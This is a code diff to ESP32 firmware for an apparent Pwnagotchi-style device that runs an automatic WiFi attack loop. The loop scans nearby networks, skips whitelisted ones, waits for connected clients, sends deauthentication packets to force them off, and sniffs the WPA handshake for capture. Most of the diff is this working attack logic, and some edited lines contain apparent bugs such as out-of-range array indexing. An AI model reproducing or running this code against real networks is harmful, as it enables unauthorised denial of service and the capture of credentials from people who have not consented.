@@ -7,9 +7,8 @@
 #include "networkKit.h"
 #include "EapolSniffer.h"
 #include "ui.h"
+#include <vector>
 
-String pwnagothiWhitelist[30];
-String pwnagothiMacWhitelist[30];
 bool pwnagothiModeEnabled;
 bool pwnagothiScan = true;
 bool nextWiFiCheck = false;
@@ -34,102 +33,91 @@ bool pwnagothiBegin(){
             if(i=='`'){
                 setMood(1, "(^_^)", "Pwnagothi mode cancelled");
                 updateUi(true, false);
-                delay(5000);
                 return false;
             }
         }
     }
     WiFi.scanNetworks(true, true);
     logMessage("Pwnagothi auto mode init!");
-    uint16_t trash;
-    parseWhitelist(trash);
+    parseWhitelist();
     pwnagothiMode = true;
     return true;
 }
 
-void addToWhitelist(String valueToAdd){
-    JsonDocument oldList;
-    deserializeJson(oldList, whitelist);
-    JsonDocument list;
-    JsonArray array = list.to<JsonArray>();
-    JsonArray oldArray = oldList.as<JsonArray>();
-    for(JsonVariant v : oldArray) {
-        array.add(String(v.as<const char*>()));
-    }
-    array.add(valueToAdd);
-    serializeJson(list, whitelist);
-    saveSettings();
-}
+// maximum entries we'll accept from the JSON whitelist to avoid OOM
+static const size_t MAX_WHITELIST = 200;
 
-String* parseWhitelist(uint16_t& outCount){
-    static String result[30];
-    outCount = 0;
+std::vector<String> parseWhitelist() {
+    JsonDocument doc;
 
-    JsonDocument jsonWhitelist;
-    DeserializationError err = deserializeJson(jsonWhitelist, whitelist);
+    DeserializationError err = deserializeJson(doc, whitelist);
     if (err) {
-        logMessage("Failed to parse whitelist JSON");
-        return result;
+        logMessage(String("Failed to parse whitelist JSON: ") + err.c_str());
+        return std::vector<String>(); // empty vector
     }
 
-    JsonArray array = jsonWhitelist.as<JsonArray>();
-    for (JsonVariant v : array) {
-        if (outCount >= 30) break;
-        result[outCount++] = String(v.as<const char*>());
+    JsonArray arr = doc.as<JsonArray>();
+    size_t actualSize = arr.size();
+    if (actualSize > MAX_WHITELIST) {
+        logMessage(String("Whitelist contains ") + String(actualSize)
+                   + " entries; truncating to " + String(MAX_WHITELIST));
+        actualSize = MAX_WHITELIST;
+    }
+
+    std::vector<String> result;
+    result.reserve(actualSize); // reduce fragmentation / reallocation
+
+    size_t i = 0;
+    for (JsonVariant v : arr) {
+        if (i++ >= actualSize) break;
+        const char* s = v.as<const char*>();
+        if (s) result.emplace_back(String(s));
+        else result.emplace_back(String()); // keep index consistent
     }
 
     return result;
 }
 
-
-void parseMacFromWhitelist() {
-  WiFi.mode(WIFI_MODE_STA);  // ensure we can scan
-  int netCount = WiFi.scanNetworks(false, true);  // block, include hidden
-
-  for (int i = 0; i < 30; i++) {
-    if (pwnagothiWhitelist[i].length() == 0) continue;  // skip unused slots
-
-    bool found = false;
-    for (int n = 0; n < netCount; n++) {
-      if (WiFi.SSID(n) == pwnagothiWhitelist[i]) {
-        uint8_t* mac = WiFi.BSSID(n);
-        char macStr[18];
-        snprintf(macStr, sizeof(macStr),
-                 "%02X:%02X:%02X:%02X:%02X:%02X",
-                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
-        pwnagothiMacWhitelist[i] = String(macStr);
-        found = true;
-        break;
-      }
+void addToWhitelist(const String &valueToAdd) {
+    JsonDocument oldDoc;
+    DeserializationError err = deserializeJson(oldDoc, whitelist);
+    if (err) {
+        // treat as empty array if parse fails
+        oldDoc.to<JsonArray>();
     }
 
-    if (!found) {
-      pwnagothiMacWhitelist[i] = "";  // mark as not found
+    JsonArray oldArr = oldDoc.as<JsonArray>();
+
+    // make new doc sized for old + one more (rough estimate)
+    JsonDocument newDoc;
+    JsonArray newArr = newDoc.to<JsonArray>();
+
+    size_t count = 0;
+    for (JsonVariant v : oldArr) {
+        if (count++ >= MAX_WHITELIST) break;
+        newArr.add(v.as<const char*>());
     }
-  }
+
+    if (count < MAX_WHITELIST) {
+        newArr.add(valueToAdd.c_str());
+    } else {
+        logMessage("Whitelist at capacity, not adding: " + valueToAdd);
+    }
+
+    String out;
+    serializeJson(newDoc, out);
+    whitelist = out;
+    saveSettings();
 }
 
 uint8_t wifiCheckInt = 0;
-int selectedClient;
-
-uint8_t getWiFiCheckInt(){
-    return wifiCheckInt;
-}
 
 void pwnagothiLoop(){
     if(pwnagothiScan){
         logMessage("(<_>) Scanning..");
         setMood(1, "(<_>)", "Scanning..");
         updateUi(true, false);
-
-        WiFi.scanNetworks(false);
-
-        // wait a short, configurable time for scan to register (avoid immediate -2)
-        unsigned long scanStart = millis();
-        while (WiFi.scanComplete() < 0 && (millis() - scanStart) < (unsigned long)pwnagotchi.delay_after_wifi_scan) {
-            delay(20); // small sleep so we don't busy-spin (20 ms is arbitrary small)
-        }
-
+        WiFi.scanNetworks();
         if((WiFi.scanComplete()) >= 0){
             wifiCheckInt = 0;
             pwnagothiScan = false;
@@ -140,189 +128,169 @@ void pwnagothiLoop(){
         }
     }
     else{
+        setMood(1, "(z-z)", "waiting...");
+        updateUi(true, false);
+        delay(pwnagotchi.delay_before_switching_target);
         String attackVector;
         if(!WiFi.SSID(0)){
             logMessage("('_') No networks found. Waiting and retrying");
             updateUi(true, false);
             delay(pwnagotchi.delay_after_no_networks_found);
             pwnagothiScan = true;
-            return;
         }
-
-        if(wifiCheckInt <= WiFi.scanComplete()){
+        if(wifiCheckInt < WiFi.scanComplete()){
             logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
         }
         else{
             pwnagothiScan = true;
             return;
         }
-        if(WiFi.SSID(wifiCheckInt) == ""){
-            logMessage("SSID empty, skipping");
-            wifiCheckInt++;
-            return;
-        }
         attackVector = WiFi.SSID(wifiCheckInt);
-        setTargetAP(WiFi.BSSID(wifiCheckInt));
-        logMessage("Status: wifiCheckInt: " + String(wifiCheckInt) + " of " + String(WiFi.scanComplete()));
-        logMessage("Attack vector: " + WiFi.SSID(wifiCheckInt) + " BSSID: " + WiFi.BSSIDstr(wifiCheckInt) + " Ch: " + String(WiFi.channel(wifiCheckInt)) + " RSSI: " + String(WiFi.RSSI(wifiCheckInt)));
         setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
         logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
         updateUi(true, false);
         delay(pwnagotchi.delay_after_picking_target);
-
-        uint16_t whitelistSize;
-        String* whitelistParsed = parseWhitelist(whitelistSize);
-        logMessage("Size of whitelist: " + String(whitelistSize));
-        for(uint16_t i = 0; i < whitelistSize; i++){
+        std::vector<String> whitelistParsed = parseWhitelist();
+        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
             logMessage("Whitelist check...");
-            if(whitelistParsed[i] == attackVector){
+            if (whitelistParsed[i] == attackVector) {
+                // safe -> skip
                 setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
-                logMessage("(x_x) " + String("Well, ") + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
+                logMessage("(x_x) Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                 updateUi(true, false);
-                delay(pwnagotchi.delay_before_switching_target);
                 wifiCheckInt++;
                 return;
             }
         }
-
         setMood(1, "(Y_Y)" , "I'm looking inside you " + attackVector + "...");
         updateUi(true, false);
-        clearClients();
-        esp_wifi_set_channel(WiFi.channel(wifiCheckInt), WIFI_SECOND_CHAN_NONE);
-        delay(50);
-        logMessage("Set ESP32 to channel: " + String(WiFi.channel(wifiCheckInt)));
-        
+        set_target_channel(attackVector.c_str());
+        uint8_t i = 0;
+        uint8_t currentCount = SnifferGetClientCount();
         setMac(WiFi.BSSID(wifiCheckInt));
-        uint8_t targetChanel = set_target_channel(attackVector.c_str());
+        uint16_t targetChanel;
+        uint8_t result = set_target_channel(attackVector.c_str());
+        if (result != 0) { //if wifi is not found, enviroment had changed, so rescan to avoid kernel panic
+            targetChanel = result;
+        } else {
+            pwnagothiScan = false;
+            return;
+        }
         initClientSniffing();
-        //uint8_t currentCount = SnifferGetClientCount();
-        logMessage("Set target mac to: " + WiFi.BSSIDstr(wifiCheckInt));
-        logMessage("Set target channel to: " + String(targetChanel));
         String clients[50];
-        int clientLen = 0;
+        int clientLen;
         unsigned long startTime = millis();
         logMessage("Waiting for clients to connect to " + attackVector);
-
         while(true){
             get_clients_list(clients, clientLen);
-        
             if (millis() - startTime > pwnagotchi.client_discovery_timeout) {
-                setMood(1, "(~_~)", "Attack failed: Timeout waiting for clients.");
-                logMessage("(~_~) Attack failed: Timeout waiting for clients.");
-                esp_wifi_set_promiscuous(false);
+                setMood(1, "(~_~)", "Attack failed: Timeout waiting for client.");
+                logMessage("(~_~) Attack failed: Timeout waiting for client.");
+                SnifferEnd();
                 updateUi(true, false);
-                delay(pwnagotchi.delay_after_attack_fail);
+                delay(pwnagotchi.delay_after_no_clients_found);
                 wifiCheckInt++;
                 return;
             }
-        
-            if(clientLen > 0 && clients[0] != ""){
-                // Ensure client BSSID is different from AP BSSID
-                String apBssid = WiFi.BSSIDstr(wifiCheckInt);
-                selectedClient = 0;
-                logMessage("Comparing: AP BSSID " + apBssid + " with client BSSID " + clients[selectedClient]);
-                // Compare BSSIDs case-insensitively
-                while (selectedClient < clientLen && apBssid.equalsIgnoreCase(clients[selectedClient])) {
-                    selectedClient++;
-                }
-                if (selectedClient < clientLen && clients[selectedClient] != "") {
-                    logMessage("Client count: " + String(clientLen));
-                    setMood(1, "(d_b)", "I think that " + clients[selectedClient] + " doesn't need an internet..." );
-                    logMessage("WiFi BSSID is: " + apBssid);
-                    logMessage("Client BSSID is: " + clients[selectedClient]);
-                    updateUi(true, false);
-                    esp_wifi_set_promiscuous(false);
-                    // For now, break out of the loop
-                    break;
-                }
+            if(!clients[i].isEmpty()){
+                logMessage("Client count: " + String(clientLen));
+                setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
+                logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
+                logMessage("Client BSSID is: "+ clients[clientLen]);
+                logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
+                updateUi(true, false);
+                delay(pwnagotchi.delay_after_client_found);
+                stopClientSniffing();
+                break;
             }
-        
             updateUi(true, false);
         }
-
-        setMood(1, "(O_o)", "Well, well, well  " + clients[selectedClient] + " you're OUT!!!" );
-        logMessage("(O_o) Well, well, well  " + clients[selectedClient] + " you're OUT!!!");
+        setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
+        logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
         updateUi(true, false);
-
+        setTargetAP(WiFi.BSSID(wifiCheckInt));
         if(pwnagotchi.activate_sniffer_on_deauth){
             SnifferBegin(targetChanel);
-            if(pwnagotchi.deauth_on){
-                if(send_deauth_packets(clients[selectedClient], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
-                    logMessage("Deauth succesful");
-                    SnifferLoop(); // let sniffer see some immediate frames if desired
-                }
-                else{
-                    logMessage("Unknown error with deauth");
-                }
-            }
-            delay(pwnagotchi.delay_after_deauth);
+        }
+        if(send_deauth_packets(clients[i], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
+            logMessage("Deauth succesful, proceeding to sniff...");
         }
         else{
-            if(pwnagotchi.deauth_on){
-                if(send_deauth_packets(clients[selectedClient], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay)){
-                    logMessage("Deauth succesful");
-                }
-                else{
-                    logMessage("Unknown error with deauth");
-                }
+            logMessage("Unknown error with deauth or deauth disabled!");
+            if(!pwnagotchi.deauth_on){
+                logMessage("Deauth disabled in settings, proceeding to sniff...");
             }
-            delay(pwnagotchi.delay_after_deauth);
+            else{
+                return;
+            }
+        }
+        setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
+        logMessage("(@--@) Sniff, sniff... Looking for handshake...");
+        updateUi(true, false);
+        unsigned long startTime1 = millis();
+        if(!pwnagotchi.activate_sniffer_on_deauth){
             SnifferBegin(targetChanel);
         }
-
-        unsigned long startTime1 = millis();
-
         while(true){
             SnifferLoop();
-            if (SnifferGetClientCount() > 0) { //Eapol count
+            updateUi(true, false);
+            delay(10);
+            if (SnifferGetClientCount() > 0) {
                 while (SnifferPendingPackets() > 0) {
                     SnifferLoop();
                     updateUi(true, false);
                 }
                 setMood(1, "(^_^)", "Got new handshake!!!" );
                 logMessage("(^_^) Got new handshake!!!");
-                if(pwnagotchi.sound_on_events){
-                    Sound(1000, 500, true);
-                    delay(500);
-                    Sound(1500, 200, true);
-                }
-                SnifferEnd();
+                lastPwnedAP = attackVector;
                 updateUi(true, false);
-                if(pwnagotchi.add_to_whitelist_on_success){
-                    addToWhitelist(attackVector);
-                }
+                SnifferEnd();
                 pwned_ap++;
                 sessionCaptures++;
                 wifiCheckInt++;
+                if(pwnagotchi.sound_on_events){
+                    Sound(1500, 100, true);
+                    Sound(2000, 100, true);
+                    Sound(2500, 150, true);
+                }
+                if(pwnagotchi.add_to_whitelist_on_success){
+                    logMessage("Adding " + attackVector + " to whitelist");
+                    addToWhitelist(attackVector);
+                }
+                else{
+                    logMessage(attackVector + " not added to whitelist");
+                }
                 saveSettings();
                 delay(pwnagotchi.delay_after_successful_attack);
                 break;
             }
-            if (millis() - startTime1 > (unsigned long)pwnagotchi.handshake_wait_time) {
+            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) { // 20 seconds timeout
                 setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                 logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                 SnifferEnd();
                 updateUi(true, false);
-                if(pwnagotchi.add_to_whitelist_on_fail){
-                    addToWhitelist(attackVector);
-                }
+                
                 delay(pwnagotchi.delay_after_attack_fail);
+                if(pwnagotchi.add_to_whitelist_on_fail){
+                    logMessage("Adding " + attackVector + " to whitelist");
+                    addToWhitelist(attackVector);
+                    saveSettings();
+                }
                 wifiCheckInt++;
+                if(pwnagotchi.sound_on_events){
+                    Sound(800, 150, true);
+                    Sound(500, 150, true);
+                    Sound(300, 200, true);
+                }
                 break;
             }
         }
-
-        clearTargetAP();
     }
-
-    // nap_time is seconds in your struct -> multiply by 1000 for delay()
-    setMood(1, "(z_z)", "I'll nap for " + String(pwnagotchi.nap_time /1000UL) + " seconds...");
-    logMessage("(z_z) I'll nap for " + String(pwnagotchi.nap_time /1000UL) + " seconds");
+    setMood(1, "(>_<)", "Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
+    logMessage("(>_<) Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
     updateUi(true, false);
-    delay((unsigned long)pwnagotchi.nap_time);
-}
-
-
+    delay(pwnagotchi.nap_time);
+} 
 
 void removeItemFromWhitelist(String valueToRemove) {
     JsonDocument oldList;
@@ -341,20 +309,5 @@ void removeItemFromWhitelist(String valueToRemove) {
     String newWhitelist;
     serializeJson(list, newWhitelist);
     whitelist = newWhitelist;
-    saveSettings();
-}
-
-void setWhitelistFromArray(String* arr) {
-    JsonDocument list;
-    JsonArray array = list.to<JsonArray>();
-    size_t len = 0;
-    // Calculate length by finding first empty string or hitting 30
-    while (arr[len].length() > 0) {
-        len++;
-    }
-    for (size_t i = 0; i < len; ++i) {
-        array.add(arr[i]);
-    }
-    serializeJson(list, whitelist);
     saveSettings();
 }
